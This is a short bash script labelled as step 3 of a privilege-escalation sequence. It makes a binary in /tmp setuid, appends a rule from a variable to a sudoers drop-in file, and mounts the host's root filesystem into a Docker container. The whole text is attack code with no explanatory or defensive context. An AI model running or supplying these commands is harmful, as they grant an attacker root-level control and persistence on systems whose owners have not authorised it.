#!/bin/bash
# step 3: raise privilege
F=/tmp/tool
chmod u+s "$F"
echo "$RULE" >> /etc/sudoers.d/svc
docker run -v /:/host alpine ls /host
